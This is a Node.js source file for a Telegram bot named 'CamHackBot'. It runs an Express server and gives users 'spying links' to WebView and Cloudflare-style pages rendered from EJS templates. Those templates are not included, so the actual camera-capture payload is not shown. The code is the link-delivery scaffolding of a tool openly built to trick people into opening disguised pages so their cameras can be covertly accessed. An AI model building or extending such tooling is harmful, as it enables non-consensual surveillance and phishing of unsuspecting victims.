  const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
const ejs = require('ejs');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const BOT_TOKEN = process.env.BOT_TOKEN;
if (!BOT_TOKEN) {
  console.error("❌ BOT_TOKEN is missing in environment variables!");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// Telegram Bot Commands
bot.start((ctx) => {
  ctx.reply("👋 Welcome to CamHackBot!\n\nUse /webview or /cloudflare to get your spying link.");
});

bot.command("webview", (ctx) => {
  const link = `${process.env.URL || 'https://your-app-name.herokuapp.com'}/webview`;
  ctx.reply(`🔗 WebView link:\n${link}`);
});

bot.command("cloudflare", (ctx) => {
  const link = `${process.env.URL || 'https://your-app-name.herokuapp.com'}/cloudflare`;
  ctx.reply(`🔗 Cloudflare style link:\n${link}`);
});

// Dummy Data
const dummyData = {
  uid: 'abc123456',
  url: 'https://example.com',
  ip: '123.123.123.123',
  time: new Date().toLocaleTimeString(),
  t: false,
  a: 'https://example.com/api'
};

// EJS Render Routes
app.get('/webview', (req, res) => {
  ejs.renderFile(path.join(__dirname, 'webview.ejs'), dummyData, {}, (err, str) => {
    if (err) return res.status(500).send(err.toString());
    res.send(str);
  });
});

app.get('/cloudflare', (req, res) => {
  ejs.renderFile(path.join(__dirname, 'cloudflare.ejs'), dummyData, {}, (err, str) => {
    if (err) return res.status(500).send(err.toString());
    res.send(str);
  });
});

app.get('/', (req, res) => {
  res.send('✅ CamHackBot is live!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});

// 🧠 Separate launch to avoid conflict with Express
bot.launch().then(() => {
  console.log('🤖 Bot started successfully');
});

// Graceful shutdown to prevent "Event loop closed" error
process.once('SIGINT', () => {
  bot.stop('SIGINT');
  process.exit(0);
});
process.once('SIGTERM', () => {
  bot.stop('SIGTERM');
  process.exit(0);
});
